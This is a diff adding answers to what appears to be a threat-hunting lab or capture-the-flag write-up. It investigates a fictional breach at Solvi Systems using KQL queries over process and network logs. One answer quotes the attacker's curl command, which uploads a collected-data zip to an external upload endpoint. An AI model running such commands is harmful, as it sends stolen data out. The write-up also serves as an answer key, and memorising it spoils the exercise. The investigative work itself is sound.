@@ -103,3 +103,33 @@ Looking for a curl command.<br><br>
 **Answer: curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload**<br><br>
 
 **Q11. How many accounts were used by the threat actor to exfiltrate sensitive information from Solvi Systems?**<br><br>
+Look for uploads the the domain in previous answer.<br><br>
+
+```
+ProcessEvents
+| where process_commandline contains "https://api.eco-awareness-update.net/upload"
+| distinct hostname
+```
+<br>
+
+**Answer: 3**<br><br>
+
+**Q12. The threat actors were observed reading an "internal process" document from an internal portal called ____.solvisystems.com**<br><br>
+Looking for inbound connections, past the date from question 4 and the url will contain 'solvisystems.com'<br><br>
+
+```
+InboundNetworkEvents
+| where timestamp > datetime(5/27/2024, 4:23:10 PM)
+| where url contains "solvisystems.com"
+```
+<br>
+
+```
+https://devportal.solvisystems.com/development_lifecycle/internal_process.pdf
+```
+<br>
+
+**Answer:devportal**<br><br>
+
+**Q13. What was the subject of those emails?**<br><br>
+**Answer: **<br><br>
